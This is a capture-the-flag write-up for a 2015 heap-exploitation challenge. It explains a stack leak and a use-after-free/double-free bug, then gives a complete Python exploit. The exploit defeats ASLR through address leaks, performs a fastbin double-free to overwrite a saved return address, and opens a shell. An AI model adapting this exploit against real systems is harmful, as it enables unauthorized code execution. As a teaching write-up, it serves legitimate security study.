## Search Engine - Pwn 230 Problem - Writeup by Robert Xiao (@nneonneo)
https://github.com/pwning/public-writeup/tree/master/9447ctf2015/pwn230-search

### Description

> Ever wanted to search through real life? Well this won't help, but it will let you search strings.

> Find it at search-engine-qgidg858.9447.plumbing port 9447.

> search [md5sum=bf61fbb8fa7212c814b2607a81a84adf]

### Reversing

This program implements a very simple "word search" program. You can add a
sentence, which splits the sentence on spaces and allows you to search for the
words in the sentence.

There are two bugs here. First, when you enter 48 chars in `read_int`
(`sub_400A40`) the result is not null-terminated, allowing you to leak stack
data via the error message.

Second, the serious bug is that deleting a sentence (after locating it via
search) erases the sentence contents and frees the sentence, but doesn't remove
the words pointing at the sentence. This opens both a use-after-free bug (which
can be abused to leak information via the sentence printout) and a double-free
bug (which can be abused to corrupt the heap).

### Exploit

We can leak stack addresses via the `read_int` bug, heap addresses by freeing
two consecutive small sentences ("fastbin" sized, i.e. less than 128 bytes
total), and libc addresses by freeing a larger sentence ("smallbin" sized).
Thus, we can fully defeat ASLR. Note that we can search for a deleted sentence
by searching for a word containing all nulls, provided the sentence starts with
a non-null (for a freed chunk, this means the chunk must not be at the end of
the free list).

We can abuse the double free to corrupt the heap by creating three fastbin
sentences, then freeing all three. The result is the free chain
`[head]->a->b->c->NULL`. We can then free `b` again to get
`[head]->b->a->b->...` which results in a cycle. (We can't directly free `a`
because that would trigger glibc's double-free detection).

Now, we can allocate `b` as a sentence and overwrite the first 8 bytes (the
fastbin next pointer) with a pointer `p` of our choosing, since `b` is still
considered free according to `a`'s next pointer. Allocate twice more to put `p`
at the fastbin head. The fourth allocation, then, allocates anywhere in memory
we want _subject to the fastbin metadata constraint_. This constraint means that
the pointer has to have a valid fastbin metadata tag.

In the stack of the `main` function are some pointers like 0x400xxx. We can
deliberately misalign our pointer so that these pointers look like the word
0x000040, which is a valid metadata tag (for a fastbin chunk of size 0x40). I
picked a pointer that is near `main`'s saved EIP. Then, the allocation will let
us write a "sentence" over the saved EIP. Once we request an exit, `main`
returns and hands us a shell.

See the full exploit in `pwn.py`.

### Flag

    9447{this_w4S_heAPs_0f_FUn}

### Exploit
```python
import sys
from socket import *
TARGET = ('search-engine-qgidg858.9447.plumbing', 9447)

s = socket()
s.connect(TARGET)

def rd(*suffixes):
    out = ''
    while 1:
        x = s.recv(1)
        if not x:
            raise EOFError()
        sys.stdout.write(x)
        sys.stdout.flush()
        out += x

        for suffix in suffixes:
            if out.endswith(suffix):
                break
        else:
            continue
        break
    return out

def pr(x):
    s.send(str(x))
    print "<%s" % x

def menu():
    rd('3: Quit')

import re
import struct

# stack ptr leak via lack of termination in read_buf when len=48
menu()
pr('a'*96)
rd('is not a valid number')
stackptr = re.findall('a{48}(......) is not', rd('is not a valid number\n'))
if not stackptr:
    raise Exception("sorry, couldn't leak stack ptr")
stackptr = struct.unpack('<Q', stackptr[0] + '\0\0')[0]
print "Leaked stack pointer:", hex(stackptr)
# stackptr points precisely at the first read_int buffer (it's the strtol argument)

# heap leak via use-after-free, fastbin
pr('2\n') # add sentence
pr('56\n')
pr('a'*50 + ' DREAM')

menu()
pr('2\n') # add sentence
pr('56\n')
pr('b'*50 + ' DREAM')

menu()
pr('1\n') # search
pr('5\n')
pr('DREAM')
pr('y\n') # delete
pr('y\n') # delete

menu()
pr('1\n') # search
pr('5\n')
pr('\0' * 5)
rd('Found 56: ')
heapptr = struct.unpack('<Q', rd('Delete')[:8])[0]
print "Leaked heap pointer:", hex(heapptr)
heapbase = heapptr & ~0xfff
pr('n\n')

# libc leak via use-after-free, smallbin
menu()
pr('2\n') # add sentence
pr('512\n')
pr(('b'*256 + ' FLOWER ').ljust(512, 'c'))

menu()
pr('1\n') # search
pr('6\n')
pr('FLOWER')
pr('y\n') # delete

menu()
pr('1\n') # search
pr('6\n')
pr('\0'*6)
rd('Found 512: ')
libcptr = struct.unpack('<Q', rd('Delete')[:8])[0]
print "Leaked libc pointer:", hex(libcptr)
libcbase = libcptr - 0x3be7b8
pr('n\n')

# allocate three fastbin (0x38) sentences
menu()
pr('2\n') # add sentence
pr('56\n')
pr('a'*51 + ' ROCK')

menu()
pr('2\n') # add sentence
pr('56\n')
pr('b'*51 + ' ROCK')

menu()
pr('2\n') # add sentence
pr('56\n')
pr('c'*51 + ' ROCK')

# free all of them, starting with "c"
menu()
pr('1\n') # search
pr('4\n')
pr('ROCK')
pr('y\n') # delete 'c'
pr('y\n') # delete 'b'
pr('y\n') # delete 'a'

# ok, now the free list is [head]->a->b->c->NULL
# double-free to create a loop
menu()
pr('1\n') # search
pr('4\n')
pr('\0' * 4)
pr('y\n') # delete 'b'
pr('n\n') # don't delete 'a'

# now the free list is [head]->b->a->b->...
# allocate to take advantage of this
menu()
pr('2\n') # add sentence
pr('56\n')
pr(struct.pack('<Q', stackptr + 0x52).ljust(48, '\0') + ' MIRACLE')

# [head]->a->b->x
menu()
pr('2\n') # add sentence
pr('56\n')
pr('d'*48 + ' MIRACLE')

# this last allocation overlaps the first one.
# [head]->b->x
menu()
pr('2\n') # add sentence
pr('56\n')
pr('e'*48 + ' MIRACLE')

# now this last allocation goes wherever we want
# we chose a *stack address* which is deliberately misaligned.
# this causes a 0x40xxxx address to be interpreted as a valid 0x40 metadata item.
menu()
pr('2\n') # add sentence
pr('56\n')
ret = 0x400896
system_magic = libcbase + 0x4652c
pr(('A'*6 + struct.pack('<QQQQ', ret, ret, ret, system_magic)).ljust(56, 'U'))

menu()
pr('3\n') # exit, triggering return to our overwritten buffer

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

# 9447{this_w4S_heAPs_0f_FUn}
```